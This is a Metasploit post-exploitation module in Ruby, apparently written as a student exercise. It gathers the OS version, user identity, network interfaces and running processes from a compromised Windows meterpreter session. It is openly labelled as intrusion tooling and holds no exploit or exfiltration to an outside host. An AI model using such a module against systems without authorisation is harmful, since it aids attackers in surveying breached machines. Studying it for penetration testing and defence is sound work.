##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Priv

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Windows Information Gathering',
      'Description'    => %q{
        This module gathers system information from a compromised
        Windows target including OS version, user accounts,
        network configuration, and running processes.
      },
      'Author'         => ['Holberton Student'],
      'License'        => MSF_LICENSE,
      'Platform'       => ['win'],
      'SessionTypes'   => ['meterpreter']
    ))
  end

  def run
    print_status("Gathering system information from #{session.session_host}")

    gather_system_info
    gather_user_info
    gather_network_info
    gather_running_processes
  end

  def gather_system_info
    begin
      sysinfo = session.sys.config.sysinfo
      os = sysinfo['OS']
      computer = sysinfo['Computer']

      print_status("OS: #{os}")
      print_status("Computer: #{computer}")
    rescue ::Exception => e
      print_error("Failed to gather system info: #{e.message}")
    end
  end

  def gather_user_info
    begin
      user = session.sys.config.getuid
      print_status("User: #{user}")
    rescue ::Exception => e
      print_error("Failed to gather user info: #{e.message}")
    end
  end

  def gather_network_info
    begin
      interfaces = session.net.config.interfaces

      interfaces.each do |iface|
        name = iface.info
        addrs = iface.addrs

        addrs.each do |addr|
          next if addr.nil? or addr.empty?
          print_status("Interface: #{name}, IP: #{addr}")
        end
      end
    rescue ::Exception => e
      print_error("Failed to gather network info: #{e.message}")
    end
  end

  def gather_running_processes
    begin
      processes = session.sys.process.get_processes

      processes.each do |proc|
        pid = proc['pid']
        name = proc['name']
        print_status("Process #{pid} - #{name}")
      end
    rescue ::Exception => e
      print_error("Failed to gather process info: #{e.message}")
    end
  end
end
